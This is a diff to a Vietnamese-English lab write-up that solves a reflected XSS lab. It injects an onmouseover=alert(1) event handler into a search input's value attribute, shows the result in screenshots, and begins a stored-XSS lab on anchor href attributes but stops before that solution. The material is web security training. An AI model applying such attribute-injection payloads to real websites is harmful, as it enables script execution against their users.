@@ -286,5 +286,35 @@ Lab Solved!
 
 ***
 
-## 9. 
+## 9. Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+
+* Content:
+```
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
+```
+* Exploit:
+
+Search và theo dõi Kết quả trả về hiển thị bên phía trình duyệt trong thẻ input
+
+`<input type=text placeholder='Search the blog...' name=search value="ndkhai">`
+
+<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f617e8bc-61d6-438d-98b7-4e65e07572cd">
+
+=> Áp dụng payload tấn công như sau: 
+
+`<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">`
+
+LAB SOLVED!
+
+<img width="563" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/36a636df-1bc8-42e3-b722-12a8212ebe4f">
+
+***
+
+## 10. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+* Content:
+```
+This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.
+```
+* Exploit:
 
